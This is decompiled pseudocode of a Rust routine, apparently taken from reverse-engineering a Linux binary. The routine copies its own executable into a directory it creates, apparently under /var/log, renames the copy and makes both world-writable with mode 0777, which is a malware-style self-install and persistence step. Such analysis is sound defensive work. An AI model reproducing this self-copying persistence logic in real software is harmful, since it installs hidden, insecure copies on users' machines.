__int64 binary::install::copy_self()
{
  __int64 v0; // r8
  __int64 v1; // r9
  __int64 v2; // rax
  __int64 v3; // r8
  __int64 v4; // r9
  __int64 v5; // rax
  __int64 v6; // r8
  __int64 v7; // r9
  __int128 v8; // rax
  __int64 v9; // rax
  __int64 v10; // r8
  __int64 v11; // r9
  __int64 v12; // rax
  __int64 v13; // r8
  __int64 v14; // r9
  __int64 v16; // rax
  __int64 v17; // r8
  __int64 v18; // r9
  __int128 v19; // [rsp+0h] [rbp-B8h] BYREF
  __int128 **v20; // [rsp+10h] [rbp-A8h]
  __int128 v21; // [rsp+18h] [rbp-A0h]
  const char *v22; // [rsp+30h] [rbp-88h] BYREF
  __int64 v23; // [rsp+38h] [rbp-80h]
  const char *v24; // [rsp+40h] [rbp-78h]
  __int64 v25; // [rsp+48h] [rbp-70h]
  __int64 v26; // [rsp+50h] [rbp-68h]
  __int128 *v27; // [rsp+58h] [rbp-60h] BYREF
  __int64 (__fastcall *v28)(); // [rsp+60h] [rbp-58h]
  __int128 v29; // [rsp+68h] [rbp-50h] BYREF
  _BYTE v30[8]; // [rsp+78h] [rbp-40h] BYREF
  __int128 v31; // [rsp+80h] [rbp-38h]
  __int128 v32; // [rsp+90h] [rbp-28h] BYREF
  __int128 **v33; // [rsp+A0h] [rbp-18h]

  if ( (unsigned __int64)((__int64 (*)(void))core::sync::atomic::atomic_load)() >= 3 )
  {
    *(_QWORD *)&v19 = &off_18E6C30;
    *((_QWORD *)&v19 + 1) = 1LL;
    v20 = (__int128 **)&byte_8;
    v21 = 0LL;
    v22 = aBinaryInstall;
    v23 = 15LL;
    v24 = aBinaryInstall;
    v25 = 15LL;
    v26 = log::__private_api::loc(&off_18E6C90);
    log::__private_api::log(&v19, 3LL, &v22, aBinaryInstall, v0, v1);
  }
  <T as alloc::slice::<impl [T]>::to_vec_in::ConvertVec>::to_vec(&v19, aVarLogCross, 15LL);
  v33 = v20;
  v32 = v19;
  *(_QWORD *)&v19 = std::fs::create_dir_all(&v32);
  if ( (_QWORD)v19 )
  {
    core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(&v19);
    if ( core::sync::atomic::atomic_load(&v19) )
    {
      *(_QWORD *)&v19 = &off_18E6C40;
      *((_QWORD *)&v19 + 1) = 1LL;
      v20 = (__int128 **)&byte_8;
      v21 = 0LL;
      v2 = log::__private_api::loc(&off_18E6D20);
      v22 = aBinaryInstall;
      v23 = 15LL;
      v24 = aBinaryInstall;
      v25 = 15LL;
      v26 = v2;
      log::__private_api::log(&v19, 1LL, &v22, aBinaryInstall, v3, v4);
    }
  }
  else
  {
    core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(&v19);
    *(_QWORD *)&v19 = std::fs::set_permissions(&v32, 511LL);
    if ( (_QWORD)v19 )
    {
      core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(&v19);
      if ( core::sync::atomic::atomic_load(&v19) )
      {
        *(_QWORD *)&v19 = &off_18E6C50;
        *((_QWORD *)&v19 + 1) = 1LL;
        v20 = (__int128 **)&byte_8;
        v21 = 0LL;
        v5 = log::__private_api::loc(&off_18E6D08);
        v22 = aBinaryInstall;
        v23 = 15LL;
        v24 = aBinaryInstall;
        v25 = 15LL;
        v26 = v5;
        log::__private_api::log(&v19, 1LL, &v22, aBinaryInstall, v6, v7);
      }
    }
    else
    {
      core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(&v19);
      std::path::Path::join(v30, *((_QWORD *)&v32 + 1), v33, aAutoColor, 10LL);
      std::env::current_exe(&v19);
      core::result::Result<T,E>::unwrap(&v22, &v19);
      *(_QWORD *)&v8 = std::fs::copy(&v22, v30);
      v29 = v8;
      if ( (_QWORD)v8 )
      {
        core::ptr::drop_in_place<core::result::Result<u64,std::io::error::Error>>(&v29);
        if ( core::sync::atomic::atomic_load(&v29) )
        {
          v29 = v31;
          v27 = &v29;
          v28 = <std::path::Display as core::fmt::Display>::fmt;
          *(_QWORD *)&v19 = &off_18E6C60;
          *((_QWORD *)&v19 + 1) = 1LL;
          v20 = &v27;
          v21 = 1uLL;
          v9 = log::__private_api::loc(&off_18E6CF0);
          v22 = aBinaryInstall;
          v23 = 15LL;
          v24 = aBinaryInstall;
          v25 = 15LL;
          v26 = v9;
          log::__private_api::log(&v19, 1LL, &v22, aBinaryInstall, v10, v11);
        }
      }
      else
      {
        core::ptr::drop_in_place<core::result::Result<u64,std::io::error::Error>>(&v29);
        *(_QWORD *)&v19 = std::fs::set_permissions(v30, 511LL);
        if ( (_QWORD)v19 )
        {
          core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(&v19);
          if ( core::sync::atomic::atomic_load(&v19) )
          {
            v29 = v31;
            v27 = &v29;
            v28 = <std::path::Display as core::fmt::Display>::fmt;
            *(_QWORD *)&v19 = &off_18E6C70;
            *((_QWORD *)&v19 + 1) = 1LL;
            v20 = &v27;
            v21 = 1uLL;
            v12 = log::__private_api::loc(&off_18E6CD8);
            v22 = aBinaryInstall;
            v23 = 15LL;
            v24 = aBinaryInstall;
            v25 = 15LL;
            v26 = v12;
            log::__private_api::log(&v19, 1LL, &v22, aBinaryInstall, v13, v14);
          }
        }
        else
        {
          core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(&v19);
          if ( (unsigned __int64)core::sync::atomic::atomic_load(&v19) >= 3 )
          {
            v29 = v31;
            v27 = &v29;
            v28 = <std::path::Display as core::fmt::Display>::fmt;
            *(_QWORD *)&v19 = &off_18E6C80;
            *((_QWORD *)&v19 + 1) = 1LL;
            v20 = &v27;
            v21 = 1uLL;
            v16 = log::__private_api::loc(&off_18E6CC0);
            v22 = aBinaryInstall;
            v23 = 15LL;
            v24 = aBinaryInstall;
            v25 = 15LL;
            v26 = v16;
            log::__private_api::log(&v19, 3LL, &v22, aBinaryInstall, v17, v18);
          }
        }
      }
      core::ptr::drop_in_place<std::path::PathBuf>(v30);
    }
  }
  return core::ptr::drop_in_place<std::path::PathBuf>(&v32);
}